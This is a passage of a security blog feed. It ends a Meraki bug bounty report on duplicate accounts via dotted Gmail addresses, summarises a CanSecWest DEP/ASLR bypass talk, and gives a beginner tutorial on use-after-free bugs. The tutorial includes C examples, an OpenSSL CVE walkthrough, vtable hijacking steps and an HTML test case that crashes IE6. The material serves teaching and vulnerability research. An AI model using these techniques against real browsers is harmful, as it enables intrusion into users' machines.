<u><b>Miscellaneous aka Pointless:<br />
</b></u> <br />
This section contains few observations that cannot be either classified as a security bug or that a poc exploit was not producible. I found worth mentioning it on the report so this was also included in my reports to cisco. <br />
<br />
<b><u>Observation 1:  <br />
</u></b><br />
It is possible to create multiple accounts under same email. This under certain scenarios could be dangerous.<br />
<br />
<a href="https://account.meraki.com/login/new_account" target="_blank">https://account.meraki.com/login/new_account</a><br />
<br />
The application treats <br />
<br />
<a href="mailto:fb1h2s@gmail.com">fb1h2s@gmail.com</a> and <a href="mailto:fb1h2.s@gmail.com">fb1h2.s@gmail.com</a> to be two different id’s but gmail treats both the ids to be same. So n no of registrations can be made using a single email id.  This could be fixed if necessary.<br />
 <br />
<br />
Any way I had a productive weekend and some easy CASH[$$$] , so this bug hunting was fun profitable ;). Let me see when I can find time for more bounties. <br />
<br />
Regards,<br />
<u><b>Rahul Sasi<br />
</b></u><a href="http://in.linkedin.com/pub/rahul-sasi-fb1h2s/15/112/b91/" target="_blank">http://in.linkedin.com/pub/rahul-sas...2s/15/112/b91/</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1044</guid>
		</item>
		<item>
			<title>DEP ASLR bypass without ROP JIT : CanSecWest2013 Slides and Analysis</title>
			<link>http://garage4hackers.com/entry.php?b=785</link>
			<pubDate>Fri, 08 Mar 2013 00:33:07 GMT</pubDate>
			<description>I have my own talk from CanSecwest to blog about but this one is more interesting and the most awaited one. So here are the slides, I will add my own...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">I have my own talk from CanSecwest to blog about but this one is more interesting and the most awaited one. So here are the slides, I will add my own analysis and test cases to this blog entry later. <b><u>Interesting thing is we had this technique discussed on garage in november</u></b> <a href="http://www.garage4hackers.com/f22/win7-64bit-no-aslr-dep-bypass-required-vinnu-3080.html" target="_blank">http://www.garage4hackers.com/f22/wi...innu-3080.html</a> .<br />
<br />
Yu Yang @tombkeeper did a demo of the technique on Ms013-08 and it does not ever need a heap spray for his ASLR/DEP bypass technique .<br />
<br />
And the exploit is scary, its a quick kaboom with out heap spray.<br />
He calls this method GIFT [ Got it form a table] . <br />
The simple technique is to change the VFT of wow64sharedinformation and it's ptr.<br />
<br />
 Here are couple of quick notes on the bypass Technique :<br />
<br />
<br />
<u><b>Good news about the Technique:. </b></u><br />
<br />
<ul><li style="">Totally ASLR/DEP free</li><li style="">Language/SP independent</li><li style="">Work on almost all use-after-free/vtable-overflow</li><li style="">Target on IE, firefox, pdf reader, flash, office …</li><li style="">Even don’t need shellcode</li><li style="">Sometimes don’t need heapspray</li><li style="">Need a Windows file sharing server</li><li style="">It is not a real problem</li><li style="">Only work on 32-bit process in x64 Windows</li><li style="">This situation is very common</li><li style="">Can not work on Windows 8</li></ul><br />
<br />
The documents and presentation is from Yu Yang @tombkeeper<br />
Download Slides from here:<br />
<a href="https://docs.google.com/file/d/0B46UFFNOX3K7bl8zWmFvRGVlamM/edit?usp=sharing" target="_blank">https://docs.google.com/file/d/0B46U...it?usp=sharing</a><br />
<br />
Cheers.</blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=785</guid>
		</item>
		<item>
			<title><![CDATA[Beginners Guide to "Use after free Exploits #IE 6 0-day #Exploit Development"]]></title>
			<link>http://garage4hackers.com/entry.php?b=517</link>
			<pubDate>Thu, 15 Nov 2012 00:39:57 GMT</pubDate>
			<description><![CDATA[http://www.youtube.com/watch?v=SLk4Ia0otko 
Yea right!  
 
Last week a friend asked few queries regarding use after free vulnerabilities, . It's been...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">
<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/SLk4Ia0otko?wmode=opaque" frameborder="0"></iframe>
<br />
Yea right! <br />
<br />
Last week a friend asked few queries regarding use after free vulnerabilities, . It's been a while I wrote a tutorial so taught of cooking a beginners guide this week end.  I wanted a live target for the tutorial so my plans were to run my fuzzer on an old version of IE 6, since it is easy to find a bug in and it's not worth to blog out any new versions 0-day ;) . Any way I picked up the first test case IE crashed on and did some analysis to add it up to this tutorial.I din't spent much time with the crash since it's pointless to digg deep<br />
<br />
 So this blog post I will explain in detail the following. <br />
<br />
1)The OS Heap and memory allocations. <br />
2)Use after free issues and example buggy codes.<br />
3) Analysis of a IE 6 crash, Use after free issue.<br />
4) Exploiting Use after free bugs.<br />
*Stay tuned for som Win8 IE10 stuffs ;<br />
<br />
<br />
The Basics of OS Memory Management  :<br />
<br />
<u>Memory used by  program is divided into four,<br />
</u><br />
<ul><li style="">The code area aka text segment [compiled program in memory ].</li><li style="">The globals      [global variables are stored] .</li></ul><div style="margin-left:40px">Initialized Data Segment<br />
Uninitialized Data Segment.</div><ul><li style="">The heap, dynamically allocated variables.</li><li style="">The stack,  parameters and local variables .</li></ul><img src="http://garage4hackers.com/attachment.php?attachmentid=548&amp;d=1352541699" border="0" alt="Name:  cmemory003.png
Views: 6717
Size:  1.6 KB"  style="float: CONFIG" /><br />
*Above image has mapped the lower and higher memory wrong.<br />
<b>Code Area:</b><br />
This is the region in a virtual adress space that holds the executing instructions.It is is assigned memory below the stack and heap, to prevent an overflow overwriting the code. <br />
<b><br />
The Globals:</b><br />
<br />
<b>Initialized Data segment [DS]. <br />
</b><br />
This region holds the global and static variables that are initialized by the programmer. <br />
<br />
For example:<br />
 <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">int a = 0;
char * fb =&quot;fb1h2s&quot;;</pre>
</div>The string is stored in the initialized read only area.<br />
<br />
<b>Uninitialized Data segment [BSS]. <br />
</b><br />
For example:<br />
 <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">int a 
int b ;</pre>
</div>This would be in the BSS segment<br />
<br />
<b>Stack:<br />
</b><br />
Stack is a [Last in First out] data structure , so it's basically used for local storages and <a href="http://en.wikipedia.org/wiki/Call_stack" target="_blank">function calls etc</a>.It has got it's own registers and instructions sets. So it even hold the raw byte of instruction executed by the program. This is one of the reason why stack based vulnerabilities are easy to exploit. <br />
<br />
Stack allocations are done when variables are stored directly to memory . <br />
<br />
For example:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">void&nbsp;f</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">true</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;b&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">b&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Here value of &quot;b&quot; is already declared and know so &quot;int b&quot; is allocated on the stack. <br />
*b is not available outside the if  { } block, so the above program would have compilation issues. <br />
<br />
<b>Heap :<br />
</b>So considering the above if we need to handle memmory dynamically ,thats where Heap comes into picture. Heap overtakes the disability of stack, it's is the segment where dynamic memory allocation usually takes place. <br />
Unlike stack memmory allocations[LIFO] the term &quot;heap memory allocations&quot; is unrelated to heap data structure. It's basically a linked list of used and free blocks. When a request for memory is made by functions like (new,malloc,GlobalAlloc,LocalAlloc, malloc,HeapAlloc,RtlAllocateHeap etc) they are satis&#64257;ed by providing a suitable block from one of the free blocks. This requires updating list of blocks on the heap [Heap Management ]. This meta information about the blocks on the heap is also stored on the heap often in a small area just in front of every block .The various OS implementation of heap management functions make use of these meta info when allocating and freeing heap. And the many heap based exploits out there make use of these heap management structures to achieve code execution by feeding them with malformed data.  <br />
Note: Heap overflow and [Dangling pointer, Use after free bugs] are two diff things. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=547&amp;d=1352541032" border="0" alt="Name:  SafeMemoryUtilization03SingleHeapAllocation.jpg
Views: 6534
Size:  12.3 KB"  style="float: CONFIG" /><br />
<br />
<b>Bulletins</b>: <br />
<br />
 • The heap size is predefined at application startup but can grow as per required.<br />
<br />
• You would use the heap if you don’t know exactly how much data you will need at runtime or if you need to allocate a lot of data.<br />
<br />
• Responsible for memory leak, you need to free the unused memory manually.<br />
<br />
• You need to manually free memory onces it is no more in use and that should never fall out of scope. The data is freed with GlobalFree , LocalFree, delete[] free etc functions .<br />
<br />
• Can have allocation failures if too big of a bu&#64256;er is requested to be allocated.<br />
<br />
• All shared libraries and dynamically loaded modules in a process could access the heap. This same reason why you can do heap spraying on a browser using any loaded modules example: flash,java script ,vbs etc. <br />
<br />
<a href="http://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap/1213360#1213360" target="_blank">memory management - What and where are the stack and heap? - Stack Overflow</a><br />
<br />
<b><u>Example Program Demonstrating memory allocations. <br />
</u></b><div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:336px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"><br />int&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">x</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Uninitialized&nbsp;variable&nbsp;stored&nbsp;in&nbsp;bss*/<br /></span><span style="color: #0000BB">int&nbsp;w</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Uninitialized&nbsp;variable&nbsp;stored&nbsp;in&nbsp;bss*/<br /></span><span style="color: #0000BB">int&nbsp;y&nbsp;</span><span style="color: #007700">=</span><span style="color: #0000BB">10&nbsp;</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Initialized&nbsp;variable&nbsp;stored&nbsp;in&nbsp;DSS*/<br /></span><span style="color: #0000BB">void&nbsp;b</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">1</span><span style="color: #007700">==</span><span style="color: #0000BB">1</span><span style="color: #007700">)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">x&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">malloc</span><span style="color: #007700">(</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(int));&nbsp;</span><span style="color: #FF8000">/*&nbsp;Memmory&nbsp;allocated&nbsp;in&nbsp;Heap&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*memory&nbsp;not&nbsp;freed&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">}<br />&nbsp;&nbsp;<br />}<br /><br /></span><span style="color: #0000BB">void&nbsp;c</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">free</span><span style="color: #007700">(</span><span style="color: #0000BB">x</span><span style="color: #007700">);&nbsp;</span><span style="color: #FF8000">/*&nbsp;Memory&nbsp;Freed&nbsp;*/<br /></span><span style="color: #007700">}&nbsp;<br /></span><span style="color: #0000BB">int&nbsp;main</span><span style="color: #007700">(</span><span style="color: #0000BB">void</span><span style="color: #007700">)<br />{&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;static&nbsp;</span><span style="color: #0000BB">int&nbsp;f&nbsp;</span><span style="color: #007700">=</span><span style="color: #0000BB">10&nbsp;&nbsp;</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Initialized&nbsp;static&nbsp;variable&nbsp;stored&nbsp;in&nbsp;DS&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">static&nbsp;</span><span style="color: #0000BB">int&nbsp;i</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Uninitialized&nbsp;static&nbsp;variable&nbsp;stored&nbsp;in&nbsp;bss&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">b</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">c</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><a href="http://www.geeksforgeeks.org/archives/14268" target="_blank">http://www.geeksforgeeks.org/archives/14268</a><br />
<br />
In short large variables of arrays whose size may vary, heap memory allocation is used. So heap related security issues occur when<br />
1) Not freeing all of the memory allocated ending up with memory leaks.<br />
2)Using of already released memory would lead to Use after free security issues.<br />
3) Double freeing memory would cause memory corruptions . <br />
<br />
<br />
<u><b><font color="#3E3E3E">Use after free issues and example buggy codes.<br />
</font></b></u>[I]#dangling pointers #use after free #double free<br />
<br />
<i><u>Example Buggy program:<br />
</u></i><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:204px;">int main(void)
{   
char *ch_ptr = malloc(100);
int i;
for (i = 0; i &lt; 99; i++) 
{
ch_ptr<i> = 'A';
free(ch_ptr);
printf(&quot;%s\n&quot;, ch_ptr);

}

}

</i></pre>
</div><i><br />
<br />
Here at line 3 char_ptr is allocated a 100 bytes heap and later inside the for loop at line 8 the heap is deallocated.  And at line 9 the de referenced pointer is called again. So this will trigger a memory corruption as follows.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=550&amp;d=1352590591" border="0" alt="Name:  Ufa-exe1-tiff.jpg
Views: 6144
Size:  97.6 KB"  style="float: CONFIG" /><br />
<br />
So the exploitation goes based on the nature of the crash, we will dig into the exploitation methods later.<br />
<br />
<br />
<b>A Live example:</b><br />
<br />
For demonstration a good and easy to understand bug would be the CVE-2009-1379 OpenSSL from 0.9.8 to 0.9.8k use after free bug. <br />
</i><br />
<br />
<u>The buggy code:<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=552&amp;d=1352655045" border="0" alt="Name:  opuaf-tiff (2).jpg
Views: 6601
Size:  91.2 KB"  style="float: CONFIG" /><br />
</u><a href="https://bugzilla.redhat.com/attachment.cgi?id=344671&amp;action=diff" target="_blank">https://bugzilla.redhat.com/attachme...71&amp;action=diff</a><br />
<u><font color="#0000ff">The Bug:<br />
</font></u><br />
al is initilized at line 424 to &amp;frag-&gt;msg_header and at line 533 it's freed using dtls1_hm_fragment_free(frag); and at line 536  if the following condition satisfies &quot;(if al=0)&quot; then program will try to access &quot;frag&quot; line 539 which was freed at line 533. So this will cause an invalid read operation , possibly crashing the app, and if we are some how able to control the adress that its reading form [heap spray!! or what ever], then we would be able to achieve code execution. <br />
<br />
<br />
<font color="#0000ff">The Fix:<br />
</font>The simple fix to this was to add a temporary variable at line 533 &quot;<font color="#000000"><span style="font-family: monospace">frag_len = frag-&gt;msg_header.frag_len;</span></font><font color="#000000"><span style="font-family: monospace">&quot;</span></font> holding frag-&gt;msg_header.frag_len. And later return frag_len instead of the freed object.  <br />
<br />
<u><b>Fuzzing for Use After Free and Fuzzers <br />
</b></u><br />
<br />
*We will have another blog post for this some time later. <br />
<br />
<b><u>Exploiting Use after free bugs.<br />
</u></b><br />
<u>C++ Virtual Functions :</u><br />
<br />
C++ matches a correct function call based on the type of the object at runtime. This is called dynamic binding and this is done by using the keyword <i>&quot;virtual&quot;</i>. The virtual keyword instructs the compiler that it should choose the right function based on the object it's reference referred to rather than the type. These objects that are referred by virtual functions points to a virtual table VFTABLE[Virtual Function Table] . It's where all the virtual functions adress are stored. It would be the first DWORD in the object memory. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=555&amp;d=1352826557" border="0" alt="Name:  vfun3-tiff.jpg
Views: 6223
Size:  82.9 KB"  style="float: CONFIG" /><br />
Image Source:<a href="http://www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">http://www.blackhat.com/presentation...07-afek-WP.pdf</a> <br />
<br />
<br />
Example Program:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#include&lt;iostream&gt;<br /></span><span style="color: #0000BB">using&nbsp;</span><span style="color: #007700">namespace&nbsp;</span><span style="color: #0000BB">std</span><span style="color: #007700">;<br /><br />class&nbsp;</span><span style="color: #0000BB">Test<br /></span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">virtual&nbsp;void&nbsp;Show</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I&nbsp;am&nbsp;in&nbsp;Test&nbsp;Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />};<br /><br />class&nbsp;</span><span style="color: #0000BB">Test1&nbsp;</span><span style="color: #007700">:&nbsp;public&nbsp;</span><span style="color: #0000BB">Test<br /></span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">virtual&nbsp;void&nbsp;Show</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I&nbsp;am&nbsp;in&nbsp;Test1&nbsp;Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />};<br /><br /></span><span style="color: #0000BB">int&nbsp;main</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Test&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">Obj</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Test&nbsp;Obj1</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Base&nbsp;Class&nbsp;Object<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Test1&nbsp;Obj2</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//Derived&nbsp;Class&nbsp;Object<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj&nbsp;</span><span style="color: #007700">=&nbsp;&amp;</span><span style="color: #0000BB">Obj2</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">();&nbsp;&nbsp;</span><span style="color: #FF8000">//In&nbsp;this&nbsp;case&nbsp;derived&nbsp;class&nbsp;show&nbsp;function&nbsp;called.<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj&nbsp;</span><span style="color: #007700">=&nbsp;&amp;</span><span style="color: #0000BB">Obj1</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">();&nbsp;</span><span style="color: #FF8000">//In&nbsp;this&nbsp;case&nbsp;Base&nbsp;class&nbsp;show&nbsp;function&nbsp;called.<br /></span><span style="color: #007700">}<br /><br />&#91;</span><span style="color: #0000BB">B</span><span style="color: #007700">&#93;And&nbsp;</span><span style="color: #0000BB">the&nbsp;output&nbsp;is&nbsp;</span><span style="color: #007700">:&#91;/</span><span style="color: #0000BB">B</span><span style="color: #007700">&#93;<br /><br />&#91;</span><span style="color: #0000BB">CODE</span><span style="color: #007700">&#93;</span><span style="color: #0000BB">I&nbsp;am&nbsp;in&nbsp;Test1&nbsp;</span><span style="color: #007700">Class<br /></span><span style="color: #0000BB">I&nbsp;am&nbsp;in&nbsp;Test&nbsp;</span><span style="color: #007700">Class&#91;/</span><span style="color: #0000BB">CODE</span><span style="color: #007700">&#93;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><a href="http://www.go4expert.com/forums/showthread.php?t=5495" target="_blank">Virtual Functions in C++</a><br />
<a href="http://publib.boulder.ibm.com/infocenter/lnxpcomp/v8v101/index.jsp?topic=%2Fcom.ibm.xlcpp8l.doc%2Flanguage%2Fref%2Fcplr139.htm" target="_blank">IBM Linux Compilers</a><br />
<br />
The above program will have the following vftable structure. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:252px;"><font color="#800000">Class Test size(8):</font>
      <font color="#800000">+---
      |{vfptr}
      +---
      
      Test's Vftable:
      +--
      | {vfptr}
      | &amp;test::Show
      
Class Test1 size(8):
      +---
      |{vfptr}
      +---      
      
      Test1's Vftable:
      +--
      | {vfptr}
      | &amp;test1::Show</font></pre>
</div><img src="http://garage4hackers.com/attachment.php?attachmentid=554&amp;d=1352825518" border="0" alt="Name:  vfun2-tiff.jpg
Views: 6182
Size:  80.7 KB"  style="float: CONFIG" /><br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">

004013D0  |. 8D45 C8        LEA EAX,DWORD PTR SS:[EBP-38]
004013D3  |. 8945 F4        MOV DWORD PTR SS:[EBP-C],EAX
004013D6  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
004013D9  |. 8B10           MOV EDX,DWORD PTR DS:[EAX]
004013DB  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
004013DE  |. 890424         MOV DWORD PTR SS:[ESP],EAX
004013E1  |. 8B02           MOV EAX,DWORD PTR DS:[EDX]
<b>004013E3  |. FFD0           CALL EAX
</b>

<font color="#0000ff">Here EAX point to the Virtual Function table which point to calls the &quot;Test1&quot; 
</font>
004013E5  |. C70424 0000440&gt;MOV DWORD PTR SS:[ESP],vfunc.00440000                  ; |ASCII &quot;pause&quot;
004013EC  |. E8 AFF20000    CALL &lt;JMP.&amp;msvcrt.system&gt;                              ; \system
004013F1  |. 8D45 D8        LEA EAX,DWORD PTR SS:[EBP-28]
004013F4  |. 8945 F4        MOV DWORD PTR SS:[EBP-C],EAX
004013F7  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
004013FA  |. 8B10           MOV EDX,DWORD PTR DS:[EAX]
004013FC  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
004013FF  |. 890424         MOV DWORD PTR SS:[ESP],EAX
00401402  |. 8B02           MOV EAX,DWORD PTR DS:[EDX]
<b>00401404  |. FFD0           CALL EAX
</b><font color="#0000ff">Here EAX point to the Virtual Function table and calls the &quot;Test&quot; class


</font>00401406  |. C70424 0000440&gt;MOV DWORD PTR SS:[ESP],vfunc.00440000                  ; |ASCII &quot;pause&quot;
0040140D  |. E8 8EF20000    CALL &lt;JMP.&amp;msvcrt.system&gt;                              ; \system
00401412  |. B8 00000000    MOV EAX,0
00401417  |. C9             LEAVE
00401418  \. C3             RETN</pre>
</div>Lets put a break point on Call and analyze where EAX point to:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:240px;">0:000&gt; t
eax=00410a5c ebx=00004000 ecx=0040cc50 edx=00441c84 esi=00def786 edi=00def6f2
eip=004013e3 esp=0022ff10 ebp=0022ff78 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
image00400000+0x13e3:
004013e3 ffd0            call    eax {image00400000+0x10a5c (00410a5c)}


0:000&gt; u 00410a5c
image00400000+0x10a5c:
00410a5c 55              push    ebp
00410a5d 89e5            mov     ebp,esp
00410a5f 83ec08          sub     esp,8
00410a62 c744240419004400 mov     dword ptr [esp+4],offset image00400000+0x40019 (00440019)
00410a6a c70424c0334400  mov     dword ptr [esp],offset image00400000+0x433c0 (004433c0)
00410a71 e8a6b60200      call    image00400000+0x3c11c (0043c11c)
00410a76 c7442404ecae4300 mov     dword ptr [esp+4],offset image00400000+0x3aeec (0043aeec)
00410a7e 890424          mov     dword ptr [esp],eax</pre>
</div>Now that we are clear how VFtable works the exploitation of Use-after free could be done a couple of ways.The basic way of doing it would be. <br />
<ul><li style="">De allocate an object having a VFT entry</li><li style="">Controlling the Vftable and pointing it to out own [shellcode]code.</li><li style="">So now when a Virtual Function call takes place it point to our injected code.</li></ul><b><u>Use After Free Exploitation [IE 6 0-day].<br />
</u></b><br />
<br />
<br />
<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">HTML Code:</div>
	<pre class="bbcode_code" style="height:32*12px};"><span style="color:#000080">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTAL 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span>
<span style="color:#000080">&lt;html xmlns=<span style="color:#0000FF">&quot;http://www.w3.org/1999/xhtml&quot;</span> &gt;</span>
<span style="color:#000080">&lt;head&gt;</span>
<span style="color:#000080">&lt;meta http-equiv=&quot;Content-Type&quot; content=<span style="color:#0000FF">&quot;text/html; charset=utf-8&quot;</span>/&gt;</span>
<span style="color:#000080">&lt;meta http-equiv=&quot;refresh&quot; content=<span style="color:#0000FF">&quot;1&quot;</span>&gt;</span>
<span style="color:#000080">&lt;title&gt;</span>FB1H2S Browser Test , soemthing weired here<span style="color:#000080">&lt;/title&gt;</span>
<span style="color:#000080">&lt;link href=<span style="color:#0000FF">&quot;sass.css&quot;</span> rel=<span style="color:#0000FF">&quot;stylesheet&quot;</span> type=<span style="color:#0000FF">&quot;text/css&quot;</span>/&gt;</span>




<span style="color:#800000">&lt;script src=<span style="color:#0000FF">&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js&quot;</span> type=<span style="color:#0000FF">&quot;text/javascript&quot;</span>&gt;</span><span style="color:#800000">&lt;/script&gt;</span>
<span style="color:#800000">&lt;script&gt;</span>




document.write(&quot;FB1H2S Use After Free test#213&quot;);
<span style="color:#800000">&lt;/script&gt;</span>




<span style="color:#000080">&lt;/head&gt;</span>




<span style="color:#000080">&lt;body&gt;</span>




<span style="color:#000080">&lt;div style=<span style="color:#0000FF">&quot;float:left; width:770px; margin-left:8px;&quot;</span>&gt;</span>




<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s&quot;</span>&gt;</span>




<span style="color:#000080">&lt;/div&gt;</span>
<span style="color:#000080">&lt;span &gt;</span> <span style="color:#000080">&lt;/span&gt;</span>




<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s_fb1h2s&quot;</span>&gt;</span>




<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s_fb1h4s&quot;</span> &gt;</span>
IE WTF
<span style="color:#000080">&lt;/div&gt;</span>












<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;aboutproduct&quot;</span>&gt;</span>FB1H2s : FB!H2S : THE Garage 4 Hackers : Bla Bla Bla<span style="color:#000080">&lt;/div&gt;</span>
<span style="color:#000080">&lt;/div&gt;</span>




<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s_fb1h3s&quot;</span>&gt;</span>




<span style="color:#000080">&lt;/div&gt;</span>
<span style="color:#000080">&lt;/div&gt;</span>




<span style="color:#000080">&lt;/body&gt;</span>
<span style="color:#000080">&lt;/html&gt;</span>
sass.css




.fb1h2s_fb1h2s,
.fb1h2s_fb1h2s_fb1h2s{background-color:#fff;width:564px;float:left;height:auto;marg *in:5px 0 5px 9px}
.fb1h2s_fb1h2s_fb1h3s{float:left;width:164px;margi *n-left:5px}
.fb1h2s_fb1h2s_fb1h4s{width:551px;height:34px;back *ground-repeat:no-repeat;font-size:13px;font-weight:700;font-family:arial;margin-left:10px;float:left;padding:7px 0 0 10px}
